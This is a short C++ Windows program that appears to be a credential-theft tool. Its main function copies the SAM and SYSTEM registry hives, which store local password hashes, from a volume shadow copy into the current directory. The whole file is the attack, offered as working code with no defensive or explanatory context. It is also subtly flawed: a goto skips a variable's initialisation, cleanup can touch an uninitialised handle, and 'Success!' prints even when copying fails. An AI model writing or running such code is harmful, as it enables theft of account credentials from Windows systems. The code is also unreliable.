#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <WTypes.h>

#include <iostream>
#include <vector>

#define BUFFER_SIZE 4096

bool CopyData(const LPWSTR szSrc, const LPWSTR szDst)
{
	std::vector<byte> buffer;
	buffer.resize(BUFFER_SIZE);
	bool result = false;

	const auto hSrc = CreateFileW(szSrc, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hSrc == INVALID_HANDLE_VALUE)
		goto CLEAN_AND_EXIT;
	const auto hDst = CreateFileW(szDst, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
	if (hDst == INVALID_HANDLE_VALUE)
		goto CLEAN_AND_EXIT;

	DWORD dwBytesRead, dwBytesWritten;
	while (true)
	{
		dwBytesRead = 0;
		BOOL bStatus = ReadFile(hSrc, buffer.data(), BUFFER_SIZE, &dwBytesRead, nullptr);
		if (!bStatus || dwBytesRead == 0)
			break;

		dwBytesWritten = 0;
		bStatus = WriteFile(hDst, buffer.data(), dwBytesRead, &dwBytesWritten, nullptr);
		if (!bStatus || dwBytesRead != dwBytesWritten)
		{
			result = false;
			break;
		}
		result = true;
	}

CLEAN_AND_EXIT:
	SecureZeroMemory(buffer.data(), buffer.size());

	if (hSrc != nullptr && hSrc != INVALID_HANDLE_VALUE)
		CloseHandle(hSrc);
	if (hDst != nullptr && hDst != INVALID_HANDLE_VALUE)
		CloseHandle(hDst);
	return result;
}

int main(int argc, char* argv[])
{
	if (!CopyData(
		L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM",
		L"SYSTEM"))
		std::wcout << L"[!] Error occurred in copying SYSTEM file";
	if (!CopyData(
		L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM",
		L"SAM"))
		std::wcout << L"[!] Error occurred in copying SAM file";
	std::wcout << L"Success!";
	return 0;
}
